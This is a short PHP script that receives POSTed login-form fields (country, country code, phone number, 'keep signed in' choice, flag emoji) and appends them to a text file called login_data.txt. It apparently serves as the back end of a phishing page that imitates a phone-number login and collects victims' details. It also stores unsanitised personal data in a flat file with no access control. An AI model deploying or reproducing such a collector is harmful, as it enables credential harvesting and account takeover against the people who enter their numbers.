<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = $_POST;

    $text = "Country: " . $data['countryName'] . "\n" .
            "Country Code: " . $data['countryCode'] . "\n" .
            "Country ID: " . $data['countryId'] . "\n" .
            "Phone Number: " . $data['phoneNumber'] . "\n" .
            "Full Phone Number: " . $data['fullPhoneNumber'] . "\n" .
            "Keep Signed In: " . ($data['keepSignedIn'] === 'true' ? 'Yes' : 'No') . "\n" .
            "Flag Emoji: " . $data['flagEmoji'] . "\n\n";

    file_put_contents('login_data.txt', $text, FILE_APPEND);
    echo "Saved successfully";
} else {
    echo "Invalid request";
}
?>
